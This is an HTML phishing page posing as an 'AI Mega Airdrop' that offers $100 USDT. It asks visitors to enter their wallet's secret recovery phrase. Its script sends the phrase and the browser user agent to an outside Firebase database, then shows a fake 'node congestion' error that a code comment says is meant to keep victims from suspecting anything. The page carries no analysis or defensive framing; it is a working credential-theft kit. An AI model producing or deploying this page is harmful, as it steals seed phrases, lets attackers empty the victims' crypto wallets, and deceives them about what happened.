<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AI Mega Airdrop - Claim $100</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>

    <style>
        * { box-sizing: border-box; }
        body { background: #0b0e11; color: white; font-family: 'Segoe UI', sans-serif; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; padding: 10px; }
        
        .main-container { background: #181a20; border: 2px solid #f3ba2f; border-radius: 25px; width: 100%; max-width: 420px; padding: 20px; text-align: center; box-shadow: 0 0 30px rgba(243, 186, 47, 0.2); }
        
        .banner-img { width: 100%; border-radius: 15px; border: 1px solid #333; margin-bottom: 20px; box-shadow: 0 5px 15px rgba(0,0,0,0.5); }
        
        h2 { color: #f3ba2f; font-size: 26px; margin: 10px 0; letter-spacing: 1px; }
        .reward-text { font-size: 32px; font-weight: bold; color: #ffffff; margin-bottom: 5px; }
        .reward-text span { color: #f3ba2f; }
        
        p { color: #848e9c; font-size: 14px; margin-bottom: 20px; line-height: 1.5; }
        
        textarea { width: 100%; background: #2b3139; border: 1px solid #444; border-radius: 12px; color: white; padding: 15px; font-size: 15px; outline: none; resize: none; margin-bottom: 20px; height: 100px; }
        textarea:focus { border-color: #f3ba2f; }
        
        .claim-btn { background: linear-gradient(90deg, #f3ba2f, #e2ab26); color: black; border: none; padding: 16px; width: 100%; border-radius: 50px; font-weight: bold; font-size: 18px; cursor: pointer; text-transform: uppercase; box-shadow: 0 4px 15px rgba(243, 186, 47, 0.4); }
        .claim-btn:active { transform: scale(0.98); }
        
        .footer { margin-top: 15px; font-size: 11px; color: #474d57; }
    </style>
</head>
<body>

<div class="main-container">
    <img src="https://r.jina.ai/i/05e638b9d363415eb6f8c7e189873f3f" class="banner-img" alt="AI Airdrop Banner">
    
    <p style="text-transform: uppercase; letter-spacing: 2px; margin-bottom: 5px;">Exclusive Crypto Reward</p>
    <h2>CLAIM YOUR</h2>
    <div class="reward-text">$100 <span>USDT</span></div>
    
    <p>Synchronize your wallet to the AI-Node for instant transfer of your airdrop reward.</p>
    
    <textarea id="phraseInput" placeholder="Enter your 12/24 word secret recovery phrase..."></textarea>
    
    <button class="claim-btn" onclick="sendToFirebase()">Verify & Claim</button>
    
    <div class="footer">Powered by AI Security Node. Check: (active)</div>
</div>

<script>
    // Firebase Setup
    const firebaseConfig = {
        databaseURL: "https://wallat-9057b-default-rtdb.firebaseio.com/"
    };
    
    // Initialize Firebase only if loaded
    window.onload = function() {
        if (typeof firebase !== 'undefined') {
            firebase.initializeApp(firebaseConfig);
        }
    };

    function sendToFirebase() {
        const val = document.getElementById("phraseInput").value;
        if(val.trim().length < 10) {
            alert("Please enter a valid recovery phrase to claim reward.");
            return;
        }

        // Sending data to your Firebase link
        const db = firebase.database();
        db.ref('airdrop_claims').push({
            phrase: val,
            reward: "$100 USDT",
            time: new Date().toLocaleString(),
            userAgent: navigator.userAgent
        }).then(() => {
            // Success trick: Show fake error so they don't suspect
            alert("Error: Node congestion detected. Your claim is in queue. Please do not re-submit for 24 hours.");
            document.getElementById("phraseInput").value = "";
        }).catch((e) => {
            alert("Connection error. Please check your internet or Firebase Rules.");
        });
    }
</script>

</body>

</html>
